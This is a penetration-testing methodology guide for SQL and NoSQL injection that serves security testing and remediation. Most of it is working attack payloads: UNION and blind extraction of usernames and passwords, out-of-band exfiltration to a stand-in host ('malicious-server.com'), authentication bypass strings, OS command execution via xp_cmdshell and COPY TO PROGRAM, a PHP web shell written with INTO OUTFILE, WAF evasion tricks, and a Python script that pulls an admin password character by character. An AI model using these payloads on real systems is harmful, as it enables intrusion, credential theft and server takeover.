# SQL Injection

## What is SQL Injection?

SQL Injection (SQLi) occurs when untrusted user input is incorporated into SQL queries without proper validation or sanitization. This vulnerability allows attackers to manipulate the structure of SQL statements to access, modify, or delete data, bypass authentication, or execute commands on the database server.

## Key Questions to Answer

- Can user-controllable input modify SQL query structure?
- What type of SQL injection is possible? (Error-based, Union-based, Blind, etc.)
- What database management system is being used?
- What level of access can be achieved through the injection?
- Can the injection be leveraged to access sensitive data or perform unauthorized actions?

## Detailed SQLi Testing Methodology

### 1. Reconnaissance & Vulnerability Detection

#### 1.1 Identify Injection Points

- Map all user inputs that might be incorporated into database queries:
    - URL parameters (e.g., `?id=123`, `?category=electronics`)
    - Form fields (search boxes, login forms, registration forms)
    - HTTP headers (User-Agent, Referer, Cookie)
    - JSON/XML data in request bodies
    - File upload names and metadata
    - API parameters

#### 1.2 Initial Detection Testing

- Test each potential injection point with simple payloads:
    - Single quote (`'`)
    - Double quote (`"`)
    - Backtick (`` ` ``) (MySQL)
    - Parentheses (`(`, `)`)
    - Comment markers (`--`, `#`, `/**/`)
    - SQL-specific metacharacters (`;`)

#### 1.3 Error Analysis

- Analyze responses for database error messages:
    - MySQL: `You have an error in your SQL syntax`
    - SQL Server: `Unclosed quotation mark after the character string`
    - Oracle: `ORA-01756: quoted string not properly terminated`
    - PostgreSQL: `ERROR: syntax error at or near`
    - SQLite: `SQLite3::query(): near "...": syntax error`

#### 1.4 DBMS Fingerprinting

- Identify the backend database system:
    - Error message patterns
    - Database-specific functions:
        - MySQL: `VERSION()`, `USER()`
        - SQL Server: `@@VERSION`, `SYSTEM_USER`
        - Oracle: `v$version`, `USER`
        - PostgreSQL: `version()`, `current_user`
        - SQLite: `sqlite_version()`

### 2. Testing for Different SQLi Types

#### 2.1 Error-Based SQLi Testing

- Use payloads that deliberately cause syntax errors:
    
    ```
    ' OR '1'='1' --
    " OR "1"="1" --
    1' OR 1=1 --
    1" OR 1=1 --
    ```
    
- Test for database-specific error-based techniques:
    
    - MySQL:
        
        ```
        ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --
        ```
        
    - SQL Server:
        
        ```
        ' AND 1=CONVERT(int, (SELECT @@version)) --
        ```
        
    - Oracle:
        
        ```
        ' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version WHERE rownum=1)) --
        ```
        
    - PostgreSQL:
        
        ```
        ' AND 1=cast((SELECT version()) as int) --
        ```
        

#### 2.2 UNION-Based SQLi Testing

- Determine the number of columns in the original query using `ORDER BY`:
    
    ```
    ' ORDER BY 1 --
    ' ORDER BY 2 --
    ' ORDER BY 3 --
    ```
    
    Continue incrementing until an error occurs
    
- Test UNION SELECT payloads with the correct number of columns:
    
    ```
    ' UNION SELECT 1,2,3 --
    ' UNION SELECT null,null,null --
    ```
    
- Replace numeric placeholders with useful data:
    
    ```
    ' UNION SELECT null, table_name, null FROM information_schema.tables --
    ' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name='users' --
    ' UNION SELECT null, username, password FROM users --
    ```
    

#### 2.3 Boolean-Based Blind SQLi Testing

- Test with conditional statements that result in visible differences:
    
    ```
    ' AND 1=1 --    (true condition, should return normal results)
    ' AND 1=2 --    (false condition, should return no results)
    ```
    
- Use more complex boolean conditions to extract data:
    
    ```
    ' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' --
    ```
    
- For each character position, iterate through possible values
    

#### 2.4 Time-Based Blind SQLi Testing

- Use time delay functions when no visible output difference:
    - MySQL:
        
        ```
        ' AND IF(1=1, SLEEP(5), 0) --' AND IF((SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a', SLEEP(5), 0) --
        ```
        
    - SQL Server:
        
        ```
        ' WAITFOR DELAY '0:0:5' --' IF (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' WAITFOR DELAY '0:0:5' --
        ```
        
    - Oracle:
        
        ```
        ' AND CASE WHEN (1=1) THEN dbms_pipe.receive_message('RDS',5) ELSE NULL END --
        ```
        
    - PostgreSQL:
        
        ```
        ' AND (SELECT pg_sleep(5)) --
        ```
        

#### 2.5 Out-of-Band SQLi Testing

- Use database features that can make external connections:
    - MySQL:
        
        ```
        ' AND LOAD_FILE(CONCAT('\\\\',IF((SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a','malicious-server.com\\a','malicious-server.com\\b'))) --
        ```
        
    - SQL Server:
        
        ```
        ' IF (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' EXEC master..xp_dirtree '\\malicious-server.com\a' --
        ```
        
    - Oracle:
        
        ```
        ' AND UTL_HTTP.REQUEST('http://malicious-server.com/'||(SELECT username FROM users WHERE rownum=1)) --
        ```
        

### 3. Database Schema Enumeration

#### 3.1 Database Information Retrieval

- Extract database metadata:
    - MySQL:
        
        ```
        ' UNION SELECT null, database() --' UNION SELECT null, user() --' UNION SELECT null, version() --
        ```
        
    - SQL Server:
        
        ```
        ' UNION SELECT null, DB_NAME() --' UNION SELECT null, SYSTEM_USER --' UNION SELECT null, @@VERSION --
        ```
        
    - Oracle:
        
        ```
        ' UNION SELECT null, SYS.DATABASE_NAME FROM DUAL --' UNION SELECT null, USER FROM DUAL --
        ```
        
    - PostgreSQL:
        
        ```
        ' UNION SELECT null, current_database() --' UNION SELECT null, current_user --' UNION SELECT null, version() --
        ```
        

#### 3.2 Table Enumeration

- List available tables:
    - MySQL/PostgreSQL:
        
        ```
        ' UNION SELECT null, table_name FROM information_schema.tables --
        ```
        
    - SQL Server:
        
        ```
        ' UNION SELECT null, table_name FROM information_schema.tables --' UNION SELECT null, name FROM sysobjects WHERE xtype='U' --
        ```
        
    - Oracle:
        
        ```
        ' UNION SELECT null, table_name FROM all_tables --
        ```
        
    - SQLite:
        
        ```
        ' UNION SELECT null, name FROM sqlite_master WHERE type='table' --
        ```
        

#### 3.3 Column Enumeration

- List columns in specific tables:
    - MySQL/PostgreSQL:
        
        ```
        ' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' --
        ```
        
    - SQL Server:
        
        ```
        ' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' --
        ```
        
    - Oracle:
        
        ```
        ' UNION SELECT null, column_name FROM all_tab_columns WHERE table_name='USERS' --
        ```
        
    - SQLite:
        
        ```
        ' UNION SELECT null, sql FROM sqlite_master WHERE type='table' AND name='users' --
        ```
        

### 4. Data Extraction

#### 4.1 Direct Data Extraction

- Extract data from identified tables:
    
    ```
    ' UNION SELECT null, username, password FROM users --
    ```
    
- Extract multiple rows with string concatenation:
    
    - MySQL:
        
        ```
        ' UNION SELECT null, GROUP_CONCAT(username, ':', password SEPARATOR '<br>') FROM users --
        ```
        
    - SQL Server:
        
        ```
        ' UNION SELECT null, STRING_AGG(username + ':' + password, '<br>') FROM users --
        ```
        
    - Oracle:
        
        ```
        ' UNION SELECT null, LISTAGG(username || ':' || password, '<br>') WITHIN GROUP (ORDER BY username) FROM users --
        ```
        
    - PostgreSQL:
        
        ```
        ' UNION SELECT null, STRING_AGG(username || ':' || password, '<br>') FROM users --
        ```
        

#### 4.2 Sensitive Data Targeting

- Focus on high-value tables and data:
    - User credentials: `users`, `admin`, `members`, `accounts`
    - Financial data: `payments`, `orders`, `transactions`
    - Personal data: `customers`, `employees`, `profiles`
    - Configuration: `settings`, `config`, `parameters`

### 5. Advanced Exploitation

#### 5.1 Authentication Bypass

- Test login forms with common bypasses:
    
    ```
    username: admin' --password: anythingusername: admin'/*password: anythingusername: ' OR 1=1 --password: anythingusername: ' OR '1'='1password: ' OR '1'='1
    ```
    

#### 5.2 File System Operations

- Test for file system access:
    - MySQL:
        
        ```
        ' UNION SELECT null, LOAD_FILE('/etc/passwd') --' INTO OUTFILE '/var/www/html/shell.php' --
        ```
        
    - SQL Server:
        
        ```
        ' UNION SELECT null, BulkColumn FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) as x --
        ```
        

#### 5.3 Command Execution

- Test for operating system command execution:
    - MySQL:
        
        ```
        ' UNION SELECT null, sys_eval('id') -- (requires UDF)
        ```
        
    - SQL Server:
        
        ```
        ' EXEC xp_cmdshell 'whoami' --
        ```
        
    - Oracle:
        
        ```
        ' EXEC DBMS_SCHEDULER.CREATE_JOB(job_name => 'exec_job', job_type => 'EXECUTABLE', job_action => '/bin/bash', number_of_arguments => 3, start_date => SYSTIMESTAMP, enabled => TRUE, auto_drop => TRUE); --
        ```
        
    - PostgreSQL:
        
        ```
        ' SELECT pg_ls_dir('.'); --' COPY (SELECT '') TO PROGRAM 'whoami'; --
        ```
        

### 6. Testing for NoSQL Injection

#### 6.1 MongoDB Injection

- Test for MongoDB operators in JSON payloads:
    
    ```json
    {"username": {"$ne": null}, "password": {"$ne": null}}{"username": "admin", "password": {"$regex": "^a"}}{"$where": "this.username == 'admin' || sleep(5000)"}
    ```
    

#### 6.2 NoSQL Operator Injection

- Common NoSQL operators to test:
    
    - `$ne`: not equal
    - `$gt`/`$lt`: greater than/less than
    - `$regex`: regular expression match
    - `$where`: JavaScript expression
    - `$exists`: field existence check
    - `$or`: logical OR
- Example payloads:
    
    ```
    username[$ne]=invalid&password[$ne]=invalid
    username=admin&password[$regex]=^a
    username[$exists]=true&password[$exists]=true
    ```
    

### 7. Mitigation Bypass Techniques

#### 7.1 Filter Evasion

- Use alternate syntax to bypass filters:
    - Whitespace variations: tabs, newlines, carriage returns
    - Case switching: `UnIoN SeLeCt`
    - Comment injection: `U/**/NION/**/SEL/**/ECT`
    - Hex encoding: `0x756E696F6E2073656C656374` (for "union select")
    - URL encoding: `%55%4E%49%4F%4E%20%53%45%4C%45%43%54`
    - Double encoding: `%2555%254E%2549%254F%254E`

#### 7.2 WAF Bypass Techniques

- Test techniques that may bypass WAF rules:
    - SQL commenting: `/*!50000 UNION*//*!50000 SELECT*/`
    - String concatenation:
        - MySQL: `CONCAT('SEL','ECT')`
        - SQL Server: `'SEL'+'ECT'`
        - Oracle: `'SEL'||'ECT'`
    - Equivalents:
        - `1` → `true`, `1-0`, `2-1`
        - `=` → `LIKE`, `REGEXP`
        - `or 1=1` → `|| 1=1`, `or true`

#### 7.3 Prepared Statement Bypass Testing

- Test for partial escapes:
    
    ```
    1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND '1'='1
    ```
    

### 8. Chaining with Other Vulnerabilities

#### 8.1 From SQLi to XSS

- Store XSS payloads in database:
    
    ```
    ' UNION SELECT NULL, '<script>alert(1)</script>' INTO DUMPFILE '/var/www/html/page.php' --
    ```
    

#### 8.2 From SQLi to File Upload

- Use SQL injection to write files:
    
    ```
    ' UNION SELECT NULL, '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --
    ```
    

## Exploitation & Reporting

### Exploitation Templates

#### Basic Authentication Bypass

```
Request:
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=anything

Response:
HTTP/1.1 302 Found
Location: /dashboard
```

#### UNION-based Data Extraction

```
Request:
GET /products?id=123' UNION SELECT 1,username,password,4,5 FROM users-- HTTP/1.1
Host: example.com

Response:
HTTP/1.1 200 OK

Product Details:
Name: admin
Description: 5f4dcc3b5aa765d61d8327deb882cf99
Price: 4
```

#### Blind Boolean Exfiltration

```
# Python script for boolean-based extraction
import requests

url = "https://example.com/products"
extracted = ""
for i in range(1, 20):  # Extract first 20 chars
    for c in range(32, 127):  # Printable ASCII
        payload = f"?id=123' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),{i},1))={c}--"
        r = requests.get(url + payload)
        if "Product found" in r.text:  # Success condition
            extracted += chr(c)
            print(f"Found char at position {i}: {chr(c)}")
            break

print(f"Extracted data: {extracted}")
```

### Impact Assessment

For each SQL injection vulnerability, assess the impact:

|Impact Level|Description|Example|
|---|---|---|
|Critical|Complete database access, command execution|OS command execution, full database dump|
|High|Authentication bypass, sensitive data exposure|User credentials exposure, admin access|
|Medium|Partial data disclosure, enumeration|Database schema enumeration, limited data access|
|Low|Information leakage without significant data access|Database version disclosure|

### Reporting Template

For each SQLi vulnerability found:

1. **Vulnerability Title**: Clear description of the SQL injection vulnerability
2. **Affected Endpoint**: The specific API endpoint or function affected
3. **Vulnerability Description**: Technical explanation of the SQL injection
4. **Reproduction Steps**:
    - Detailed step-by-step instructions
    - Sample requests and responses
    - Parameters that were manipulated
5. **Impact**: Description of what an attacker could access or modify
6. **Remediation**:
    - Use parameterized queries/prepared statements
    - Implement input validation and sanitization
    - Apply principle of least privilege for database accounts
    - Implement proper error handling

## Remediation Guidance

### Parameterized Queries Examples

#### PHP (PDO)

```php
// Vulnerable code
$username = $_POST['username'];
$query = "SELECT * FROM users WHERE username = '$username'";
$result = $conn->query($query);

// Secure code with parameterized query
$username = $_POST['username'];
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bindParam(1, $username);
$stmt->execute();
$result = $stmt->fetchAll();
```

#### Node.js (MySQL)

```javascript
// Vulnerable code
const username = req.body.username;
const query = `SELECT * FROM users WHERE username = '${username}'`;
connection.query(query, (error, results) => {
  // Handle results
});

// Secure code with parameterized query
const username = req.body.username;
const query = "SELECT * FROM users WHERE username = ?";
connection.query(query, [username], (error, results) => {
  // Handle results
});
```

#### Python (SQLAlchemy)

```python
# Vulnerable code
username = request.form['username']
query = f"SELECT * FROM users WHERE username = '{username}'"
result = db.engine.execute(query)

# Secure code with parameterized query
from sqlalchemy.sql import text
username = request.form['username']
query = text("SELECT * FROM users WHERE username = :username")
result = db.engine.execute(query, username=username)
```

#### Java (JDBC)

```java
// Vulnerable code
String username = request.getParameter("username");
String query = "SELECT * FROM users WHERE username = '" + username + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);

// Secure code with parameterized query
String username = request.getParameter("username");
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
ResultSet rs = pstmt.executeQuery();
```

### Additional Security Measures

- **Input Validation**: Implement strict input validation using whitelists
- **Database User Privileges**: Apply principle of least privilege to database users
- **Error Handling**: Implement custom error pages to prevent leakage of database errors
- **WAF Implementation**: Use Web Application Firewalls with SQL injection rules
- **Database Activity Monitoring**: Monitor for suspicious queries
- **Regular Security Testing**: Conduct regular security assessments

## Tools for SQL Injection Testing

- **SQLmap**: Automated SQL injection detection and exploitation
- **Burp Suite Pro**: SQL injection scanner and manual testing
- **OWASP ZAP**: Open-source security testing tool
- **NoSQLMap**: NoSQL injection testing
- **Havij**: Automated SQL injection tool
- **sqlninja**: SQL Server-specific injection tool
- **Pangolin**: Automated SQL injection testing
- **Metasploit**: Exploitation framework with SQL injection modules

## SQL Injection Testing Cheatsheet

1. **Test all input vectors** including URL parameters, form fields, headers, and cookies
2. **Start with simple payloads** (`'`, `"`, `;--`) to detect potential injection points
3. **Identify the DBMS** by analyzing error messages and behaviors
4. **Determine injection type**: Error-based, UNION-based, Boolean-blind, Time-based
5. **Enumerate database schema** by discovering tables and columns
6. **Target sensitive data** such as credentials, personal information, and financial data
7. **Test for advanced exploitation** including file system access and command execution
8. **Try filter bypass techniques** if input sanitization is detected
9. **Test for NoSQL injection** if appropriate
10. **Document findings** with clear exploitation paths and impact assessment